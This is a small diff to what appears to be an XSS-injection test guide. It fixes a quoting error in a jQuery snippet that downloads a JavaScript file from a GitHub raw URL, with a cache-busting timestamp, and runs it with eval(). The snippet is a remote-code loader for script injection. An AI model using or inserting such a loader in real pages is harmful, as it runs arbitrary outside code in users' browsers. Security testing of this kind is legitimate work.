@@ -99,7 +99,7 @@ The are a lot of restrictions about importing JavaScript code into current page.
 
 ```javascript
 $.ajax({
-    url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js + new Date().getTime()',
+    url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js' + new Date().getTime(),
     success: function (data){
         eval(data);
       //parse your data here
